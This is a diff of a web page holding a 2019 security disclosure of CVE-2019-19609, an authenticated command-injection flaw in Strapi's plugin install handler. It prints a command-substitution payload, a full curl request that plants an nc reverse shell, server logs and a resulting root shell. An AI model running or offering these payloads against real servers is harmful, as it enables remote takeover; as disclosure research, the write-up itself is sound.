@@ -53,17 +53,10 @@ Fix PR: https://github.com/strapi/strapi/pull/4636
 NPM Advisory: https://www.npmjs.com/advisories/1424
 Description:
  &ldquo;Manage your content. Distribute it anywhere. The open source Headless CMS Front-End Developers love.&rdquo;
- Recently I came across a cool &ldquo;headless&rdquo; CMS called Strapi which makes creating dynamic sites painless. After poking around its code for a bit, I noticed a bit of potentially dangerous code in the plugin installPlugin and uninstallPlugin handler functions for the admin panel (packages/strapi-admin/controllers/Admin.">
-
-
-<meta itemprop="datePublished" content="2019-12-03T15:33:07&#43;00:00" />
+ Recently I came across a cool &ldquo;headless&rdquo; CMS called Strapi which makes creating dynamic sites painless. After poking around its code for a bit, I noticed a bit of potentially dangerous code in the plugin installPlugin and uninstallPlugin handler functions for the admin panel (packages/strapi-admin/controllers/Admin."><meta itemprop="datePublished" content="2019-12-03T15:33:07&#43;00:00" />
 <meta itemprop="dateModified" content="2019-12-03T15:33:07&#43;00:00" />
-<meta itemprop="wordCount" content="447">
-
-
-
-<meta itemprop="keywords" content="security research,application security,disclosure,remote code execution,cve,security,CVE-2019-19609," />
-<meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="wordCount" content="447"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="security research,application security,disclosure,remote code execution,cve,security,CVE-2019-19609," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/"/>
 
 <meta name="twitter:title" content="Strapi Framework Vulnerable to Remote Code Execution (CVE-2019-19609)"/>
@@ -146,28 +139,17 @@ Description:
             
 
             <div class="post-content">
-                
-
-<p><strong>CVE:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609" target="_blank">CVE-2019-19609</a></p>
-
-<p><strong>Vendor:</strong> Strapi (<a href="https://strapi.io" target="_blank">https://strapi.io</a>)</p>
-
+                <p><strong>CVE:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609">CVE-2019-19609</a></p>
+<p><strong>Vendor:</strong> Strapi (<a href="https://strapi.io">https://strapi.io</a>)</p>
 <p><strong>Product:</strong> Strapi Framework</p>
-
 <p><strong>Version Affected:</strong> strapi-3.0.0-beta.17.7 and earlier</p>
-
-<p><strong>Fix PR:</strong> <a href="https://github.com/strapi/strapi/pull/4636" target="_blank">https://github.com/strapi/strapi/pull/4636</a></p>
-
-<p><strong>NPM Advisory:</strong> <a href="https://www.npmjs.com/advisories/1424" target="_blank">https://www.npmjs.com/advisories/1424</a></p>
-
+<p><strong>Fix PR:</strong> <a href="https://github.com/strapi/strapi/pull/4636">https://github.com/strapi/strapi/pull/4636</a></p>
+<p><strong>NPM Advisory:</strong> <a href="https://www.npmjs.com/advisories/1424">https://www.npmjs.com/advisories/1424</a></p>
 <p><strong>Description:</strong></p>
-
 <blockquote>
 <p>&ldquo;Manage your content. Distribute it anywhere. The open source Headless CMS Front-End Developers love.&rdquo;</p>
 </blockquote>
-
 <p>Recently I came across a cool &ldquo;headless&rdquo; CMS called Strapi which makes creating dynamic sites painless. After poking around its code for a bit, I noticed a bit of potentially dangerous code in the plugin <code>installPlugin</code> and <code>uninstallPlugin</code> handler functions for the admin panel (<code>packages/strapi-admin/controllers/Admin.js</code>):</p>
-
 <pre><code class="language-javascript">  async installPlugin(ctx) {
     try {
       const { plugin } = ctx.request.body;
@@ -212,31 +194,20 @@ Description:
     }
   },
 </code></pre>
-
 <p>Both functions pass unsanitized user input <code>ctx.params.plugin</code> to <code>execa()</code> which is executed on the system.</p>
-
 <p>We can use command substitution to inject commands and execute arbitrary code alongside the <code>node</code> call:</p>
-
 <pre><code class="language-json">{&quot;plugin&quot;: &quot;documentation &amp;&amp; $(whoami &gt; /tmp/whoami)&quot;,&quot;port&quot;:&quot;1337&quot;}
 </code></pre>
-
 <p>This payload should create a <code>/tmp/whoami</code> file on the target system.</p>
-
 <p>To reproduce this issue the app must be using <code>strapi-3.0.0-beta.17.7</code> or earlier. This is an authenticated RCE, so we would need a valid JWT with access to install and uninstall plugins.</p>
-
 <p>With a valid <code>JWT</code>, we can issue this <code>curl</code> command to execute a reverse shell payload on the server:</p>
-
 <pre><code class="language-c">curl -i -s -k -X $'POST' -H $'Host: localhost:1337' -H $'Authorization: Bearer [jwt]' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\&quot;plugin\&quot;:\&quot;documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)\&quot;,\&quot;port\&quot;:\&quot;1337\&quot;}' $'http://localhost:1337/admin/plugins/install'
 </code></pre>
-
 <p>The strapi server debug log will confirm the input was not sanitized:</p>
-
 <pre><code>[] info Installing documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)...
 [] Error: Command failed: npm run strapi -- install documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f)
 </code></pre>
-
 <p>The c2 server receives the connection from the reverse shell:</p>
-
 <pre><code class="language-c"># nc -lvp 4444
 listening on [any] 4444 ...
 connect to [127.0.0.1] from localhost [127.0.0.1] 47520
@@ -244,11 +215,8 @@ connect to [127.0.0.1] from localhost [127.0.0.1] 47520
 uid=0(root) gid=0(root) groups=0(root)
 # 
 </code></pre>
-
 <p>To Strapi&rsquo;s credit, I reported this issue and about 20 minutes later they had a fix ready.</p>
-
 <h4 id="disclosure-timeline">Disclosure timeline</h4>
-
 <ul>
 <li>2019-12-01 - Issue disclosed to Strapi</li>
 <li>2019-12-01 - Strapi fixes the issue</li>
@@ -277,7 +245,7 @@ uid=0(root) gid=0(root) groups=0(root)
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2020</span>
+            <span>&copy; 2021</span>
             
                 <span><a href="/">Bit Therapy</a></span>
             
@@ -305,7 +273,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 
 
-<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
 
 
 
